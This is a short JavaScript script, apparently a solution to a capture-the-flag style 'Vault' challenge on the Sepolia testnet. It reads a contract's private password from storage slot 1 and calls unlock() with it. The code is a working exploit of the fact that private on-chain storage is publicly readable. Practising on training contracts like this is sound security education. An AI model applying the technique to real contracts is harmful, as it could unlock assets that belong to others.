const {ethers} = require('hardhat');
require('dotenv').config();

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const SECOND_PRIVATE_KEY = process.env.SECOND_PRIVATE_KEY;
const ALCHEMY_SEPOLIA_URL = process.env.ALCHEMY_SEPOLIA_URL;

const provider = new ethers.providers.JsonRpcProvider(ALCHEMY_SEPOLIA_URL);
const wallet1 = new ethers.Wallet(PRIVATE_KEY, provider);
const wallet2 = new ethers.Wallet(SECOND_PRIVATE_KEY, provider);


const Vault_Json = require('../artifacts/contracts/Vault.sol/Vault.json');
const Vault_ABI = Vault_Json.abi;
const Vault_Address = '0xBfFad1757584Fc6f03Dbf256febCDc055CDd5362';
const Vault = new ethers.Contract(Vault_Address, Vault_ABI, wallet2);

const main = async  () => {
    var locked = await Vault.locked();
    console.log(`Is locked?----> ${locked}`);
    const password = await ethers.provider.getStorageAt(Vault_Address,1);
    //输出password
    console.log(`password----> ${password}`);
    //在控制台打印：解锁
    console.log(`==解锁==`);
    const tx = await Vault.unlock(password);
    await tx.wait(1);
    locked = await Vault.locked();
    console.log(`Is locked?----> ${locked}`);
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });